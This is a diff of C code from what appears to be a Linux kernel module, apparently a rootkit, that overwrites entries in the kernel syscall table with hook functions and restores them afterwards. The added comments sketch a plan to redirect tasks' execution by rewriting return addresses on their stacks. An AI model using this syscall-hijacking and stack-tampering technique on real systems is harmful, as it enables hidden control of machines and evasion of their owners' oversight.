@@ -45,8 +45,12 @@ int hookEachSyscall() {
 	real_sys_call_table = getSyscallTable();
 	for (i=0; i<NR_syscalls; i++) {
 		sys_call_table_backup[i] = real_sys_call_table[i];
-		if (syscalls_hooks[i] != NULL)
-			kmemcpy(real_sys_call_table+i, syscalls_hooks+i, sizeof(void *));
+		if (syscalls_hooks[i] != NULL) {
+			debug("Changing syscall at %d from %p to %p.\n", i,
+				  real_sys_call_table[i], syscalls_hooks[i]);
+			kmemcpy(&(real_sys_call_table[i]), &(syscalls_hooks[i]),
+					sizeof(void *));
+		}
 	}
 
 	res = 0;
@@ -89,8 +93,23 @@ int unhookEachSyscall() {
 	int res = -1;
 	int i;
 
-	for (i=0; i<NR_syscalls; i++)
-		kmemcpy(real_sys_call_table+i, sys_call_table_backup+i, sizeof(void *));
+	// Quick and dirty PoC in order to check if I can redirect the flow of
+	// tasks executing yarr_waitpid(). Check its implementation and read about
+	// the bug.
+	
+	// How to do it.
+	// For every task, check its stack trace searching for a return value to the
+	// leave instruction in yarr_waitpid() (dont hardcode or it will be a pain)
+	// change that return value to the return value of the next frame in that stack.
+
+	for (i=0; i<NR_syscalls; i++) {
+		if (real_sys_call_table[i] != sys_call_table_backup[i]) {
+			debug("Changing syscall at %d from %p to %p.\n", i,
+				  real_sys_call_table[i], sys_call_table_backup[i]);
+			kmemcpy(&(real_sys_call_table[i]), &(sys_call_table_backup[i]),
+					sizeof(void *));
+		}
+	}
 
 	res = 0;
 	return res;
